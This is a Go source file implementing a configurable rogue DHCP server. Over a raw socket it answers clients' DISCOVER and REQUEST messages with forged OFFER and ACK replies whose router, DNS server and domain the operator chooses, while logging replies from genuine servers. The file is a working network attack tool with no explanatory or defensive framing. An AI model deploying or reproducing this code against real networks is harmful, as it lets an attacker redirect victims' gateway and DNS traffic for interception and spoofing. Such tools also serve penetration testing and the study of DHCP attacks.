package dhcp

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
)

// RogueServer: a configurable DHCP rogue server
// that answers DISCOVER with OFFER and REQUEST with ACK from a sequential IP
// pool, then advances the pool cursor on each ACK.
type RogueServer struct {
	Interface string

	serverID net.IP
	startIP  uint32
	endIP    uint32
	curIP    uint32
	leaseSec uint32
	renewSec uint32
	mask     net.IP
	router   net.IP
	dns      net.IP
	domain   string

	ourMAC net.HardwareAddr
}

func (r *RogueServer) Run() error {
	iface, err := net.InterfaceByName(r.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", r.Interface, err)
	}
	if len(iface.HardwareAddr) != 6 {
		return fmt.Errorf("interface %s has invalid MAC", iface.Name)
	}
	r.ourMAC = iface.HardwareAddr

	fmt.Printf("Using interface :%s\n", r.Interface)
	if err := r.readConfig(); err != nil {
		return err
	}
	fmt.Println()

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Rogue server stopped.\n", tag())
		os.Exit(0)
	}()

	start := uint32ToIP(r.startIP)
	end := uint32ToIP(r.endIP)
	fmt.Printf("%s Rogue DHCP server on %s (pool %s-%s, server-id %s)\n",
		tag(), r.Interface, start, end, r.serverID)
	fmt.Printf("%s Waiting for DISCOVER/REQUEST... (Ctrl+C to stop)\n", tag())

	r.curIP = r.startIP
	for r.curIP <= r.endIP {
		f, reqSrcIP, msgType, err := r.waitClient(sock)
		if err != nil {
			return err
		}
		r.reply(sock, f, reqSrcIP, msgType)
		if msgType == msgRequest {
			r.curIP++
		}
	}

	fmt.Printf("%s IP pool exhausted (%s-%s).\n", tag(), start, end)
	return nil
}

func (r *RogueServer) readConfig() error {
	reader := bufio.NewReader(os.Stdin)

	serverID, err := readRequiredIPv4(reader, "Enter Server ID:")
	if err != nil {
		return err
	}
	startIP, err := readRequiredIPv4(reader, "Enter Start IP:")
	if err != nil {
		return err
	}
	endIP, err := readRequiredIPv4(reader, "Enter End IP:")
	if err != nil {
		return err
	}
	if ipToUint32(startIP) > ipToUint32(endIP) {
		return fmt.Errorf("start IP %s is after end IP %s", startIP, endIP)
	}

	leaseSec, err := readRequiredUint32(reader, "Enter Lease Time (secs):")
	if err != nil {
		return err
	}
	renewSec, err := readRequiredUint32(reader, "Enter Renew Time (secs):")
	if err != nil {
		return err
	}
	mask, err := readRequiredIPv4(reader, "Enter Subnet Mask:")
	if err != nil {
		return err
	}
	router, err := readRequiredIPv4(reader, "Enter Router:")
	if err != nil {
		return err
	}
	dns, err := readRequiredIPv4(reader, "Enter DNS Server:")
	if err != nil {
		return err
	}
	domain := readLine(reader, "Enter Domain:")

	r.serverID = serverID
	r.startIP = ipToUint32(startIP)
	r.endIP = ipToUint32(endIP)
	r.leaseSec = leaseSec
	r.renewSec = renewSec
	r.mask = mask
	r.router = router
	r.dns = dns
	r.domain = domain
	return nil
}

func readRequiredIPv4(r *bufio.Reader, label string) (net.IP, error) {
	s := readLine(r, label)
	ip := net.ParseIP(s)
	if ip == nil || ip.To4() == nil {
		return nil, fmt.Errorf("invalid IP for %s: %q", strings.TrimSuffix(label, ":"), s)
	}
	return ip.To4(), nil
}

func readRequiredUint32(r *bufio.Reader, label string) (uint32, error) {
	s := readLine(r, label)
	v, err := strconv.ParseUint(strings.TrimSpace(s), 10, 32)
	if err != nil {
		return 0, fmt.Errorf("invalid value for %s: %q", strings.TrimSuffix(label, ":"), s)
	}
	return uint32(v), nil
}

func ipToUint32(ip net.IP) uint32 {
	ip = ip.To4()
	return uint32(ip[0])<<24 | uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
}

func uint32ToIP(n uint32) net.IP {
	return net.IPv4(byte(n>>24), byte(n>>16), byte(n>>8), byte(n))
}

func (r *RogueServer) waitClient(sock rawSocket) (*frameV4, net.IP, byte, error) {
	buf := make([]byte, 1514)
	for {
		n, err := sock.Recv(buf)
		if err != nil {
			continue
		}
		frame := append([]byte{}, buf[:n]...)
		_, _, srcIP, _, srcPort, dstPort, payload, ok := parseEthIPv4UDP(frame)
		if !ok {
			continue
		}
		if srcPort != dhcpClientPort && srcPort != dhcpServerPort &&
			dstPort != dhcpClientPort && dstPort != dhcpServerPort {
			continue
		}

		f, ok := parseDHCPv4(payload)
		if !ok {
			continue
		}

		if f.op == bootReply {
			switch f.msgType {
			case msgOffer, msgAck:
				logServerV4(srcIP, f.msgType, f.yiaddr, optIP(f.options[optSubnetMask]),
					optIP(f.options[optRouter]), optIP(f.options[optDNS]), string(f.options[optDomainName]))
			case msgNak:
				fmt.Printf("%s %s NAK\n", tag(), srcIP)
			}
			continue
		}
		if f.op != bootRequest {
			continue
		}

		switch f.msgType {
		case msgDiscover:
			logClientV4(f.chaddr, msgDiscover, nil)
			return f, srcIP, msgDiscover, nil
		case msgRequest:
			logClientV4(f.chaddr, msgRequest, f.requestedIP())
			return f, srcIP, msgRequest, nil
		case msgInform:
			logClientV4(f.chaddr, msgInform, f.ciaddr)
		case msgDecline:
			logClientV4(f.chaddr, msgDecline, f.requestedIP())
		case msgRelease:
			logClientV4(f.chaddr, msgRelease, f.ciaddr)
		}
	}
}

func (r *RogueServer) reply(sock rawSocket, f *frameV4, reqSrcIP net.IP, clientMsg byte) {
	offered := uint32ToIP(r.curIP)
	replyType := byte(msgOffer)
	if clientMsg == msgRequest {
		replyType = msgAck
	}

	opts := dhcpv4Options{
		serverID: r.serverID,
		mask:     r.mask,
		router:   r.router,
		dns:      r.dns,
		domain:   r.domain,
		leaseSec: r.leaseSec,
		renewSec: r.renewSec,
	}
	body := append(f.replyHeader(offered, r.router), opts.encode(replyType)...)
	frame := buildDHCPv4Frame(f.chaddr, r.ourMAC, r.serverID, replyDestIPv4(reqSrcIP), body)
	if err := sock.Send(frame); err != nil {
		fmt.Printf("%s send error: %v\n", tag(), err)
		return
	}

	label := "OFFER"
	if replyType == msgAck {
		label = "ACK"
	}
	fmt.Printf("%s fake %s %s offering %s\n", tag(), label, formatMACUpper(f.chaddr), offered)
	logServerV4(r.serverID, replyType, offered, r.mask, r.router, r.dns, r.domain)
}
